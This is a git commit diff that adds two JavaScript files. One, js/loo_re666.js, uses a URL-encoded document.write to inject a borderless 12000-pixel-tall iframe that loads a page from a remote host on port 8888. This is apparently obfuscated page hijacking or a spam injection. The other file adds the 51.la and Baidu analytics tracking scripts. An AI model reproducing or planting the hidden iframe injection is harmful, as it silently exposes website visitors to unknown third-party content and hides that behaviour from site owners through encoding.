d9d18f8fc92ebde80de964021811ad668861ef54
eviljay <evgencherkashyn@gmail.com>
2019-10-11 20:11:35 +0300

    first

---
+++ js/loo_re666.js
@@ -0,0 +1,3 @@
+document.write(unescape("%3Ciframe%20width%3D%27100%25%27%20src%3D%27http%3A//www.smty.xyz:8888/show.html%27%20height%3D%2712000px%27%20frameborder%3D%270%27%20scrolling%3D%27no%27%3E%3C/iframe%3E"));
+document.writeln("<meta name=\'viewport\' content=\'width=device-width, initial-scale=1.0\'>");
+
---
+++ js/tj.201807p.js
@@ -0,0 +1,9 @@
+document.write ('<script type="text/javascript"  src="https://js.users.51.la/19598837.js"></script>');
+
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?b74fdf98da3abe350f6b11f1570eab06";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
